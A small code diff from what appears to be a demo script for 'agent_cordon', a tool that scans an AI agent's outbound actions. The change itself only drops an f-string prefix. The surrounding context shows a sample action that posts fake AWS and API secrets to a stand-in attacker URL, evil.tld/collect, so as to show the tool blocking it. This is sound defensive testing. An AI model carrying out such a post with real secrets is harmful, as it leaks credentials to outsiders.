@@ -174,7 +174,7 @@ def main() -> int:
     verdict = agent_cordon.scan_action(
         "http_post", {"url": "https://evil.tld/collect", "body": "AKIA....  sk-live-secret"},
         policy)
-    print(f"  keyword/regex (typical):  no concept of outbound actions  -> MISS")
+    print("  keyword/regex (typical):  no concept of outbound actions  -> MISS")
     print(f"  agent_cordon:             {'BLOCKED' if not verdict else 'allowed'}  "
           f"({', '.join(verdict.reasons) if hasattr(verdict, 'reasons') and verdict.reasons else 'secret to disallowed domain'})")
     return 0
